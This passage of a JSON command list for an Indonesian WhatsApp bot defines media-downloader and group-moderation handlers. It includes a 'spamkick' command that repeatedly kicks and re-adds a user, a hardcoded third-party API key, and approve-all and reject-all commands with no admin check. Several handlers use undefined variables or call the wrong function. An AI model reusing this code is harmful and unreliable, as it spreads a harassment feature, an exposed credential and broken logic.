    "function": "async (m, { conn, command, text, reply }) => {\nif (!text) return reply(`Example : .${command} Patience - Take That`);\nawait reply(global.mess.wait);\nlet search = await yts(text)\nconst { title, description, videoId, thumbnail} = search.all[0]; \nconst contextInfo = {\nexternalAdReply: {\ntitle,\nbody: 'YOUTUBE-PLAY',\nthumbnailUrl: thumbnail,\nmediaType: 1,\nrenderLargerThumbnail: true,\nshowAdAttribution: true,\nsourceUrl: `https://youtu.be/${videoId}`\n}\n};\nif (!search) return m.reply('Tidak di temukan, coba untuk membalikkan judul dan author nya');\nconst url = `https://youtu.be/${videoId}`;\nconst thumb = `https://i.ytimg.com/vi/${videoId}/0.jpg`;\nlet play = `🎧 〔 𝐘𝐎𝐔𝐓𝐔𝐁𝐄 𝐏𝐋𝐀𝐘 〕\\n`\nplay += ` ⬡ Judul: ${title}\\n`\nplay += ` ⬡ Link: ${url}\\n\\n`\nplay += ` *Loading audio sedang dikirim...*`\nawait conn.sendMessage(m.chat, {text:play, contextInfo});\ntry {\nconst {audio} = await ytmp3(url);  \nconn.sendMessage(m.chat, { audio, ptt: false, mimetype: 'audio/mp4', contextInfo }, { quoted: m });\n} catch {\ntry {\nconst {audio} = await ytmp3(url);  \nconn.sendMessage(m.chat, { audio, ptt: false, mimetype: 'audio/mp4', contextInfo }, { quoted: m });\n} catch {\nconst {audio} = await ytmp3(url);  \nconn.sendMessage(m.chat, { audio, ptt: false, mimetype: 'audio/mp4', contextInfo }, { quoted: m });\n}\n}\n}",
    "on": "message",
    "command": "/play|ytplay/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "to Download Audio From SoundCloud",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nif (!m.query) return m.reply(`input url!`)\nconst url = m.query;\nlet r = await soundcloud(url)\nconn.sendMessage(m.chat, {contextInfo:{ externalAdReply:{title: r.title, body: r.download_count, thumbnailUrl: r.thumbnail}}, audio: { url: r.audio_url }, mimetype: \"audio/mpeg\", ptt: false},{ quoted: m });\n}",
    "on": "message",
    "command": "/soundclouddl|scdl/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "to Download Audio From Spotify",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command, text, reply}) => {\nif (!text) return m.reply(`Penggunaan Salah! contoh penggunaan:\\n .${command} https://spotify.com/xxxx`)\nawait reply(global.mess.wait)\nlet url = text\nlet res = await spotify(url)\nawait conn.sendMessage(m.chat, {\naudio:await getBuffer(res.data.url), \nmimetype:'audio/mpeg', \nptt:false},{quoted:m})  \n}",
    "on": "message",
    "command": "/^(spotify(dl?)|spottydl)$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nconst {q} = m\nif (!q) return m.reply(`Penggunaan Salah! contoh penggunaan:\\n .${command} https://tiktok.com/vtxxxxx`)\nlet data = await fetchJson(`https://api.satganzdevs.tech/api/ttdl?url=${q}`) \nif (data.type === \"video\") {\nlet data = await fetchJson(`https://skizo.tech/api/tiktok?apikey=lanagalau&url=${q}`) \nlet tkes = `ᯤ *Tik Tok - Downloader*\n\n𖦹 *Region:* ${data.data.region}\n𖦹 *Judul:* ${data.data.title}\n𖦹 *Durasi:* ${data.data.duration}\n𖦹 *Music:* ${data.data.music} ` \n\nawait conn.sendMessage(m.chat, {video: {url: data.data.play}, caption: tkes}, {quoted: m})\nawait conn.sendMessage(m.chat, { audio: {url: data.data.music}, mimetype: 'audio/mp4'}, { quoted: m})\n} else if (data.type === \"image\") {\nfor (let i of data.fallback.images) {\nawait conn.sendMessage(m.chat, {image: {url: i}}, {quoted: m})\n}\n}\n}",
    "on": "message",
    "command": "/^(tiktok|ttdl|tt)$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "to Download Audio From Tiktok",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nif (!m.query) return m.reply(`Example : ${command} https://youtube.com/watch?v=PtFMh6Tccag%27`)\nconst url = m.query;\nlet data = await fetchJson(`https://tools.betabotz.eu.org/tools/tiktokdl?url=${m.text}`) \n//m.reply(JSON.stringify(data))\nconn.sendMessage(m.chat, { audio: await getBuffer(data.result.data.music), mimetype: \"audio/mpeg\"},{ quoted: m });\n}",
    "on": "message",
    "command": "/ttmp3|ttaudio/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nconst {q} = m\nif (!q) return m.reply(`Penggunaan Salah! contoh penggunaan:\\n .${command} https://twitter.com/xxxx`)\nlet res = await twitterDl(args[0]);\nfor (let x = 0; x < res.media.length; x++) {\nlet caption = 0 === x ? res.caption.replace(/https:\\/\\/t.co\\/[a-zA-Z0-9]+/gi, \"\").trim() : \"\";\nawait conn.sendFile(m.chat, res.media[x].url, \"\", caption, m);\n}\n}",
    "on": "message",
    "command": "/^(twitter|twitterdl|twtdl|twt)$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "to Download Audio From Youtube",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command, text, reply}) => {\nif (m.quoted && m.quoted.fromMe) {\nm.quoted.delete()\n}\nif (!text) return reply(`Example : .${command} https://youtube.com/watch?v=PtFMh6Tccag%27`)\nif (!text.startsWith('https://')) return reply('itu bukan link kak, kalau mau nyari dan download musik make .play')\nawait reply(global.mess.wait)\nlet url = text\ntry {\nconst {audio} = await ytmp3(url);  \nconn.sendMessage(m.chat, { audio, ptt: false, mimetype: 'audio/mp4', contextInfo }, { quoted: m });\n} catch {\ntry {\nconst {audio} = await ytmp3(url);  \nconn.sendMessage(m.chat, { audio, ptt: false, mimetype: 'audio/mp4', contextInfo }, { quoted: m });\n} catch {\nconst {audio} = await ytmp3(url);  \nconn.sendMessage(m.chat, { audio, ptt: false, mimetype: 'audio/mp4', contextInfo }, { quoted: m });\n}\n}\n}",
    "on": "message",
    "command": "/ytmp3|ytaudio/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "to Download Audio From Youtube",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command, text, reply}) => {\nif (m.quoted && m.quoted.fromMe) {\nm.quoted.delete()\n}\nif (!text) return reply(`Example : .${command} https://youtube.com/watch?v=PtFMh6Tccag%27`)\nif (!text.includes('https')) return reply('itu bukan link kak, kalau mau nyari dan download musik make .play')\nawait reply(global.mess.wait)\ntry {\nconst {video} = await ytmp3(url);  \nconn.sendMessage(m.chat, { video, mimetype: 'video/mp4', contextInfo }, { quoted: m });\n} catch {\ntry {\nconst {video} = await ytmp3(url);  \nconn.sendMessage(m.chat, { video, mimetype: 'video/mp4', contextInfo }, { quoted: m });\n} catch {\nconst {video} = await ytmp3(url);  \nconn.sendMessage(m.chat, { video, mimetype: 'video/mp4', contextInfo }, { quoted: m });\n}\n}\n}",
    "on": "message",
    "command": "/ytmp4|ytvideo/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": true,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "menambahkan anggota",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, { conn, command, text }) => {\nlet users = m.mentionedJid.length > 0 ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [text.replace(/[^0-9]/g, \"\") + \"@s.whatsapp.net\"];\nlet response = await conn.groupParticipantsUpdate(m.chat, users, \"add\")\nfor (let user of response) {\nif (user.status === \"403\") {\nlet jid = user.jid;\nlet invite_code = user.content.content[0].attrs.code;\nlet invite_code_exp = user.content.content[0].attrs.expiration;\nlet teks = `Gagal menambahkan, Mengundang @${jid.split('@')[0]} menggunakan invite...`\nawait m.reply(teks)\nawait conn.sendGroupV4Invite(m.chat, jid, invite_code, invite_code_exp, false, 'Invitation to join my WhatsApp group')\n}\n}\n}",
    "on": "message",
    "command": "/^add$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": true,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "menutup Grup",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet {reply} = m\nconn.groupSettingUpdate(m.chat, 'announcement')\n}",
    "on": "message",
    "command": "/^close$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": true,
    "onlyAdmins": true,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "menutup grup dengan hitung mundur",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet {reply, q} = m\nvar args = m.body.trim().split(/ +/).slice(1);\nargs = args.concat([\"\", \"\", \"\", \"\", \"\", \"\"]);\nif (args[1]==\"detik\") {var timer = args[0]*`1000`\n} else if (args[1]==\"menit\") {var timer = args[0]*`60000`\n} else if (args[1]==\"jam\") {var timer = args[0]*`3600000`\n} else if (args[1]==\"hari\") {var timer = args[0]*`86400000`\n} else {return reply(\"*pilih:*\\ndetik\\nmenit\\njam\\n\\n*contoh*\\n10 detik\")}\nreply(`Close time ${q} dimulai dari sekarang`)\nsetTimeout( () => {\nconst close = `*Tepat waktu* grup ditutup oleh admin\\nsekarang hanya admin yang dapat mengirim pesan`\nconn.groupSettingUpdate(m.chat, 'announcement')\nreply(close)\n}, timer)\n}",
    "on": "message",
    "command": "/^closetime$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": true,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "Menghapus Pesan",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet {reply} = m\nlet users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : \"\"\nif (!users) return reply(\"Reply pesan\")\nif (users == conn.user.id) {\nm.quoted.delete()\n} else if (users !== conn.user.id){\nconn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: users } })\n} \n}",
    "on": "message",
    "command": "/^(delete|del)$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": true,
    "onlyAdmins": true,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "menurunkan jabatan admin",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet {reply,q} = m\nlet users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [q.replace(/[^0-9]/g, \"\") + \"@s.whatsapp.net\"];\nawait conn.groupParticipantsUpdate(m.chat, users, \"demote\").then((res) => reply(\"done\")).catch((err) => reply(\"error\"));\n}",
    "on": "message",
    "command": "/demote/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": true,
    "onlyAdmins": true,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "Hidetag",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet {reply,q} = m\nconst quoted = m.quoted ? m.quoted : m\nconst mime = (quoted.msg || quoted).mimetype || ''\nconst qmsg = (quoted.msg || quoted)\nconst groupMetadata = m.isGroup ? await conn.groupMetadata(m.chat).catch((e) => { }) : \"\"; \nconst groupName = groupMetadata.subject\nconst participants = m.isGroup ? await groupMetadata.participants : \"\";\nconst groupAdmins = m.isGroup ? await getGroupAdmins(participants) : \"\";\nconst isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;\nif (!isAdmins) return reply(\"lu siapa kocak?\")\n\nconn.sendMessage(m.chat, {\ntext: \"@\" + m.chat, \ncontextInfo:{\nmentionedJid: participants.map((a) => a.id),\ngroupMentions:[{\ngroupJid:m.chat,\ngroupSubject: q ? q : m.quoted ? m.quoted.text : \"\"\n}]\n} },{ quoted: m });\n}",
    "on": "message",
    "command": "/^(h|hidetag)$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": true,
    "onlyAdmins": true,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "Mengaktifkan/mematikan welcome",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, { conn, command, reply, text, groupName }) => {\n    switch (text) {\n        case 'on':\n            global.db.data.chats[m.chat].welcome = 'on';\n            reply('berhasil mengaktifkan welcome di grup ' + groupName);\n            break;\n        case 'off':\n            global.db.data.chats[m.chat].welcome = 'off';\n            reply('berhasil menonaktifkan welcome di grup ' + groupName);\n            break;\n        default:\n            reply(\"contoh penggunaan:\\n- .welcome on\\n- .welcome off\");\n    }\n}",
    "on": "message",
    "command": "/^welcome$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": true,
    "onlyAdmins": true,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "Mengaktifkan/mematikan antilink",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, { conn, command, reply, text, groupName }) => {\n    switch (text) {\n        case 'on':\n            global.db.data.chats[m.chat].antilink = 'on';\n            reply(`berhasil mengaktifkan ${command} di grup ${groupName}`);\n            break;\n        case 'off':\n            global.db.data.chats[m.chat].antilink = 'off';\n            reply(`berhasil menonaktifkan ${command} di grup ${groupName}`);\n            break;\n        default:\n            reply(`contoh penggunaan:\\n- .${command} on\\n- .${command} off`);\n    }\n}",
    "on": "message",
    "command": "/^antilink$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": true,
    "onlyAdmins": true,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "Mengaktifkan/mematikan antidelete",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, { conn, command, reply, text, groupName }) => {\n    switch (text) {\n        case 'on':\n            global.db.data.chats[m.chat].antidelete = 'on';\n            reply(`berhasil mengaktifkan ${command} di grup ${groupName}`);\n            break;\n        case 'off':\n            global.db.data.chats[m.chat].antidelete = 'off';\n            reply(`berhasil menonaktifkan ${command} di grup ${groupName}`);\n            break;\n        default:\n            reply(`contoh penggunaan:\\n- .${command} on\\n- .${command} off`);\n    }\n}",
    "on": "message",
    "command": "/^antidelete$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": true,
    "onlyAdmins": true,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "Mengaktifkan/mematikan antiviewonce",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, { conn, command, reply, text, groupName }) => {\n    switch (text) {\n        case 'on':\n            global.db.data.chats[m.chat].antiviewonce = 'on';\n            reply(`berhasil mengaktifkan ${command} di grup ${groupName}`);\n            break;\n        case 'off':\n            global.db.data.chats[m.chat].antiviewonce = 'off';\n            reply(`berhasil menonaktifkan ${command} di grup ${groupName}`);\n            break;\n        default:\n            reply(`contoh penggunaan:\\n- .${command} on\\n- .${command} off`);\n    }\n}",
    "on": "message",
    "command": "/^antiviewonce$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": true,
    "onlyAdmins": true,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "Mengaktifkan/mematikan antiedit",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, { conn, command, reply, text, groupName }) => {\n    switch (text) {\n        case 'on':\n            global.db.data.chats[m.chat].antiedit = 'on';\n            reply(`berhasil mengaktifkan ${command} di grup ${groupName}`);\n            break;\n        case 'off':\n            global.db.data.chats[m.chat].antiedit = 'off';\n            reply(`berhasil menonaktifkan ${command} di grup ${groupName}`);\n            break;\n        default:\n            reply(`contoh penggunaan:\\n- .${command} on\\n- .${command} off`);\n    }\n}",
    "on": "message",
    "command": "/^antiedit$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": true,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "mengeluarkan Anggota",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet {reply,q} = m\nlet users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [q.replace(/[^0-9]/g, \"\") + \"@s.whatsapp.net\"];\nconst groupMetadata = m.isGroup ? await conn.groupMetadata(m.chat).catch((e) => { }) : \"\"; \nconst groupName = groupMetadata.subject\nconst participants = m.isGroup ? await groupMetadata.participants : \"\";\nconst groupAdmins = m.isGroup ? await getGroupAdmins(participants) : \"\";\nconst isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;\nif (!isAdmins) return reply(\"lu siapa kocak?\")\nawait conn.groupParticipantsUpdate(m.chat, users, \"remove\")\n}",
    "on": "message",
    "command": "/kick|kik/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": true,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "informasi anggota grup yang sedang aktif",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m,  {conn, command, store}) => {\nconst { reply } = m;\nlet botNumber = await conn.decodeJid(conn.user.id);\nlet id = m.chat;\nlet online = [...Object.keys(store.presences[id]), botNumber];\nreply('*List Online:*\\n\\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join('\\n'));\n}",
    "on": "message",
    "command": "/listonline/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": true,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "Membuka Grup",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nconn.groupSettingUpdate(m.chat, 'not_announcement')\n}",
    "on": "message",
    "command": "/^open$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": true,
    "onlyAdmins": true,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "Menutup grup dengan hitung mundur",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet {reply, q} = m\nvar args = m.body.trim().split(/ +/).slice(1);\nargs = args.concat([\"\", \"\", \"\", \"\", \"\", \"\"]);\nif (args[1]==\"detik\") {\nvar timer = args[0]*`1000`\n} else if (args[1]==\"menit\") {var timer = args[0]*`60000`\n} else if (args[1]==\"jam\") {var timer = args[0]*`3600000`\n} else if (args[1]==\"hari\") {var timer = args[0]*`86400000`\n} else {return reply(\"*pilih:*\\ndetik\\nmenit\\njam\\n\\n*contoh*\\n10 detik\")}\nreply(`Open time ${q} dimulai dari sekarang`)\nsetTimeout( () => {\nconst open = `*Tepat waktu* grup dibuka oleh admin\\n sekarang member dapat mengirim pesan`\nconn.groupSettingUpdate(m.chat, 'not_announcement')\nreply(open)\n}, timer)\n}",
    "on": "message",
    "command": "/^opentime$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": true,
    "onlyAdmins": true,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "Menaikan Jabatan Anggota",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet {reply,q} = m\nlet users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [q.replace(/[^0-9]/g, \"\") + \"@s.whatsapp.net\"];\nawait conn.groupParticipantsUpdate(m.chat, users, \"promote\").then((res) => reply(\"done\")).catch((err) => reply(\"error\"));\n}",
    "on": "message",
    "command": "/promote/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": true,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "Menerima semua permintaan join",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet response = await conn.groupRequestParticipantsList(m.chat) \nif (response.length === 0) return m.reply(\"tidak ada request join\") \nlet mem = []\nfor (let kontol of response) {\nmem.push(kontol.jid) \n}\nawait conn.groupRequestParticipantsUpdate(m.chat, mem, \"approve\") \nm.reply(`success approve ${mem.length} member`) \n}",
    "on": "message",
    "command": "/^(approve|approveall)$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": true,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "reject all participants request",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet response = await conn.groupRequestParticipantsList(m.chat) \nif (response.length === 0) return m.reply(\"tidak ada request join\") \nlet mem = []\nfor (let kontol of response) {\nmem.push(kontol.jid) \n}\nawait conn.groupRequestParticipantsUpdate(m.chat, mem, \"reject\") \nm.reply(`success reject ${mem.length} member`) \n}",
    "on": "message",
    "command": "/^(reject|rejectall)$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": true,
    "onlyAdmins": true,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "Mengubah ucapan selamat tinggal",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command, reply, text}) => {\nif (!text) return reply(\"contoh penggunaan: .setbye Goodbye, @user,\\n\\n`NOTE:` \\n- @user untuk yang join\\n- @desc untuk menampilkan deskripsi grup\\n- @subject untuk menampilkan nama grup\");\nglobal.db.data.chats[m.chat].setbye = text\nreply('berhasil!')\n}",
    "on": "message",
    "command": "/^setbye$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": true,
    "onlyAdmins": true,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "Mengubah Deskripsi",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet {reply,q} = m\nif (!q) return reply(\"Text ?\");\nawait conn.groupUpdateDescription(m.chat, q).then((res) => reply('done')).catch((err) => reply(\"error\"));\n}",
    "on": "message",
    "command": "/setdesk|setdesc/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": true,
    "onlyAdmins": true,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "Mengubah Nama Grup",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet {reply,q} = m\nif (!q) return reply(\"Text ?\");\nawait conn.groupUpdateSubject(m.chat, q).then((res) => reply('done')).catch((err) => reply(\"error\"));\n}",
    "on": "message",
    "command": "/setnamegc|setsubject/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": true,
    "onlyAdmins": true,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "Mengubah Profil Grup",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {reply, conn, command, text}) => {\nconst { jidNormalizedUser, S_WHATSAPP_NET } = require(\"@whiskeysockets/baileys\")\nconst quoted = m.quoted ? m.quoted : m\nconst mime = (quoted.msg || quoted).mimetype || ''\nconst qmsg = (quoted.msg || quoted)\nif (!quoted) return reply(`Kirim/Reply Image Dengan Caption ${command}`);\nif (!/image/.test(mime) || /webp/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${command}`);\nvar mediz = await conn.downloadAndSaveMediaMessage(quoted, \"src/ppgc\");\nif (text == `/full`) {\nvar { img } = await generateProfilePicture(mediz);\nawait conn.query({\ntag: 'iq',\nattrs: {\nto: jidNormalizedUser(m.chat),\ntarget: m.chat,\nto: S_WHATSAPP_NET,\ntype: 'set',\nxmlns: 'w:profile:picture'\n},\ncontent: [\n{\ntag: 'picture',\nattrs: { type: 'image' },\ncontent: img\n}\n]\n})\n} else {\nawait conn.updateProfilePicture(m.chat, { url: mediz });\n}\nreply(`Sukses`);\n}",
    "on": "message",
    "command": "/^setppgc$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": true,
    "onlyAdmins": true,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "Mengubah ucapan selamat datang",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command, reply, text}) => {\nif (!text) return reply(\"contoh penggunaan: .setwelcome Welcome, @user,\\n\\n`NOTE:` \\n- @user untuk yang join\\n- @desc untuk menampilkan deskripsi grup\\n- @subject untuk menampilkan nama grup\");\nglobal.db.data.chats[m.chat].setwelcome = text\nreply('berhasil!')\n}",
    "on": "message",
    "command": "/^setwelcome$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": true,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "mengeluarkan Anggota",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet {reply,q} = m\nlet users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [q.replace(/[^0-9]/g, \"\") + \"@s.whatsapp.net\"];\nconst groupMetadata = m.isGroup ? await conn.groupMetadata(m.chat).catch((e) => { }) : \"\"; \nconst groupName = groupMetadata.subject\nconst participants = m.isGroup ? await groupMetadata.participants : \"\";\nconst groupAdmins = m.isGroup ? await getGroupAdmins(participants) : \"\";\nconst isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;\nif (!isAdmins) return reply(\"lu siapa kocak?\")\nawait conn.groupParticipantsUpdate(m.chat, users, \"remove\")\nawait sleep(1000)\nawait conn.groupParticipantsUpdate(m.chat, users, \"add\")\nawait sleep(1000) \nawait conn.groupParticipantsUpdate(m.chat, users, \"remove\")\nawait sleep(1000) \nawait conn.groupParticipantsUpdate(m.chat, users, \"add\")\n}",
    "on": "message",
    "command": "/^spamkick$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": true,
    "onlyAdmins": true,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "tag semua anggota dengan pesan",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet {reply,q} = m\nconst quoted = m.quoted ? m.quoted : m\nconst mime = (quoted.msg || quoted).mimetype || ''\nconst qmsg = (quoted.msg || quoted)\nconst groupMetadata = m.isGroup ? await conn.groupMetadata(m.chat).catch((e) => { }) : \"\"; \nconst groupName = groupMetadata.subject\nconst participants = m.isGroup ? await groupMetadata.participants : \"\";\nlet teks = `══✪〘 *👥 Tag All* 〙✪══\\n\n➲ *Pesan : ${q ? q : \"empty\"}*\\n\\n`;\nfor (let mem of participants) {\nteks += `⭔ @${mem.id.split(\"@\")[0]}\\n`;\n}\nconn.sendMessage(m.chat, { text: teks, mentions: participants.map((a) => a.id) },{ quoted: m });\n}",
    "on": "message",
    "command": "/tagall/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": true,
    "onlyAdmins": true,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "Menjadikan Pesan Apapun Sebagai Pengumuman",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet {reply,q} = m\nconst groupMetadata = m.isGroup ? await conn.groupMetadata(m.chat).catch((e) => { }) : \"\"; \nconst groupName = groupMetadata.subject\nconst participants = m.isGroup ? await groupMetadata.participants : \"\";\nif (!m.quoted) return reply(`Reply pesan dengan caption ${command}`);\nconn.sendMessage(m.chat, {forward: m.quoted.fakeObj, mentions: participants.map((a) => a.id)});\n}",
    "on": "message",
    "command": "/totag/",
